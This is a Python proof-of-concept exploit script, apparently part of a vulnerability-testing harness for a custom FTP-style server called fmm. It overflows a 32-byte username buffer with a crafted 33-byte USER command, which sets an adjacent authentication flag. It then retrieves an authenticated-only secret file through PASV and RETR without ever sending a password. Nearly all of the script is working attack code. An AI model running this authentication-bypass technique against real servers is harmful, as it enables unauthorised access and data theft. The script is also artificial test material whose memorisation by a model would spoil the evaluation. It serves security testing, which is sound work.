#!/usr/bin/env python3
"""
PoC #2: Buffer overflow via USER -> authentication bypass
-----------------------------------------------------------
handle_user() does strcpy(session->username, arg) into a fixed 32-byte
array with no bounds check. On the reference build (g++/libstdc++,
x86-64, default struct layout) the Session fields are laid out as:

    offset 0   char username[32]
    offset 32  bool authenticated
    offset 40  std::string cwd

So a USER argument of exactly 33 bytes - 32 filler bytes followed by any
non-zero byte - overflows past the array and lands that last byte
directly on `authenticated`, flipping it true without ever sending PASS.

NOTE: exact offsets are compiler/ABI-dependent. Verify with:
    g++ -std=c++17 -x c++ - -o /tmp/offcheck <<< '
    #include <cstdio>
    #include <cstddef>
    #include <string>
    struct Session { char username[32]; bool authenticated; std::string cwd; };
    int main(){printf("auth offset=%zu\n", offsetof(Session, authenticated));}'
    /tmp/offcheck

Once `authenticated` is forged true, this PoC proves the bypass reaches a
real secret, not just an authenticated-only status code: it RETRs an
authenticated-only credential the deployment materializes INSIDE the served
root (vault/manifest.dat, written by write_flag_files() in fmm.cpp from the
runtime FMM_FLAG). RETR of a within-root path is correct, allowed behaviour,
so this disclosure is INDEPENDENT of the CWD/LIST-containment fix (#4):
fixing #4 does not flip this PoC - the auth bypass itself is what it proves,
cashed out through a read any genuinely-authenticated client is allowed to do
but this attacker never earned the right to.

Run the server first: ./fmm
Then:  python3 02_buffer_overflow_auth_bypass.py [host] [port]
"""
import os
import re
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2121

EXPECTED_FLAG = os.environ.get("FMM_FLAG") or "FLAG{local-dev-default}"
# Authenticated-only secret inside the served root; content is the flag.
VAULT_FILE = "vault/manifest.dat"


def connect():
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.recv(4096)
    return s


def cmd(s, line):
    s.sendall((line + "\n").encode())
    return s.recv(4096).decode(errors="replace")


def open_pasv(s):
    reply = cmd(s, "PASV")
    nums = reply[reply.index("(") + 1:reply.index(")")].split(",")
    port = int(nums[4]) * 256 + int(nums[5])
    return socket.create_connection((".".join(nums[:4]), port), timeout=5)


def drain(sock, timeout=1.0):
    sock.settimeout(timeout)
    chunks = b""
    try:
        while True:
            d = sock.recv(65536)
            if not d:
                break
            chunks += d
    except socket.timeout:
        pass
    return chunks.decode(errors="replace")


def main():
    s = connect()

    # 32 filler bytes to fill username[32] exactly, then 1 non-zero byte
    # that lands on the `authenticated` bool right after it.
    payload = b"A" * 32 + b"\x01"
    s.sendall(b"USER " + payload + b"\n")
    print(s.recv(4096).decode(errors="replace"), end="")

    # Never send PASS. Try an authenticated-only command directly. PASV is
    # gated on authentication (530 if not logged in, 227 if the flag is set),
    # so it makes a clean one-line proof that doesn't need a data connection.
    resp = cmd(s, "PASV")
    print(resp, end="")

    if not resp.startswith("227"):
        if resp.startswith("530"):
            print("[-] Bypass did not work - check struct layout/offsets for this build")
            s.close()
            sys.exit(1)   # cleanly rejected -> vuln FIXED
        print(f"[?] Unexpected reply - not a plain 530 rejection: {resp.strip()}")
        s.close()
        sys.exit(2)       # inconclusive -> could not run

    print("[*] Auth bypass confirmed - PASV succeeded without PASS. "
          "Fetching an authenticated-only secret (RETR), never sending PASS...")

    # RETR the within-root, auth-gated secret. This is a read a genuinely
    # logged-in client is ALLOWED to do, so it survives the CWD/LIST
    # containment fix (#4) - what's wrong here is that we never authenticated.
    data = open_pasv(s)
    print(cmd(s, f"RETR {VAULT_FILE}").strip())
    body = drain(data)

    m = re.search(r"FLAG\{[^}]+\}", body)
    if m and m.group(0) == EXPECTED_FLAG:
        print(f"[+] Auth bypass confirmed AND disclosed this deployment's "
              f"secret without ever sending PASS: {m.group(0)}")
        s.close()
        sys.exit(0)   # exploited -> vuln OPEN
    elif m:
        print(f"[-] RETR returned a flag-shaped value but it didn't "
              f"match FMM_FLAG for this run: {m.group(0)!r}")
    else:
        print(f"[-] Bypassed auth but could not read the secret: {body!r}")
    s.close()
    sys.exit(1)       # blocked -> vuln FIXED


if __name__ == "__main__":
    main()
